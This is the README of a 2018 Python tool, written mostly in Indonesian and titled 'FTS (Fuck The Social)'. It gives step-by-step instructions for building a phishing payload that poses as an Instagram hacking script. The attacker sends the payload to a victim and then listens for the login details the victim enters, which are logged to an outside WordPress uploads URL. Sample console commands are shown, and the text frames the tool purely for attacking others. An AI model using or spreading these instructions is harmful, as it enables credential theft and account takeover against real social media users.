############################################
<br>
PROJECT TITTLE : FTS (FUCK THE SOCIAL)
<br>
CODENAME       : Python
<br>
COPYRIGHT      : (C) Copyright 2018 LOoLzeC Scurity
<br>
CODED BY       : DERAY
<br>
FACEBOOK       : Deray
<br>
INSTAGRAM      : @reyy05
<br><br>
TAG            : HACKING,PHISING,SOCIAL ENGINEERING ATTACK,SOCIAL MEDIA AND FUCKING YOU ALL SOSMED!!!
<br>                                     
###########################################
<br><br>
(step satu)

membuat payload
command contoh : SET PAYLOAD AkSIsrR.txt
deskripsi : payload ini penting untuk listening nanti jika target sudah memasukan data login nya di payload yang sudah kita buat,btw tool ini harus terhubung ke internet,not offline ya akmj!1!

(step dua)

memberi output(nama file payload nya)
command contoh : SET OUTPUT hack-instagram.py
deskripsi: perlu di ingat,jangan lupa namakan file nya dengan ekstensi py

(step tiga)

memberi nama query(akun apa yang ingin anda hack)
command contoh : SET QUERY INSTAGRAM
deskripsi: jika anda memasukan query instagram,atau tittle akun apa saja yang kalian mau,otomatis query ini akan masuk ke source payload kalian contoh outputnya di target [*] Login INSTAGRAM Lu Dulu Bos...
query INSTAGRAM itu adalah query yang sudah kalian buat dengan command SET QUERY

(step empat)

memberi tanggal dan tahun
contoh command : SET DATE 2018/08
deskripsi : nah ini juga penting buat listening nanti,ane kan redirect log nya hanya di satu host wordpress,jadi nanti listening nya di sini http://ailisgarcia.com/wp-content/uploads/2018/08/ AkSIsrR.txt
apakah sudah mengerti? 2018/08 dan AkSIsrR.txt itu adalah date dan log payload yang sudah kita input dengan command SET PAYLOAD AkSIsrR.txt dan SET DATE 2018/08

(step lima)

generate
command : generate
deskripsi: dan terjadilah disini pembuatan payload kalian buat untuk di eksekusi target nanti,tunggu sampe sukses.

(step terakhir)

sebarkan payload berekstensi hack-instagram.py ke target anda,dan biarkan dia mengeksekusinya dan memasukan log data login nya terlebih dahulu

sekarang tugas anda adalah mendengarkan sampai korban memasukan log data login mereka
command : listen

atau untuk contoh manual listening command:

fts> SET PAYLOAD AkSIsrR.txt
PAYLOAD => AkSIsrR.txt
fts> SET QUERY INSTAGRAM
QUERY => INSTAGRAM
fts> SET DATE 2018/08
DATE => 2018/08
fts> listen
[*] listening..."
[*] LISTENING TARGET......"
ditunggu saja sampai korban memasukan log nya ^^

bantuan command : help,?,show options


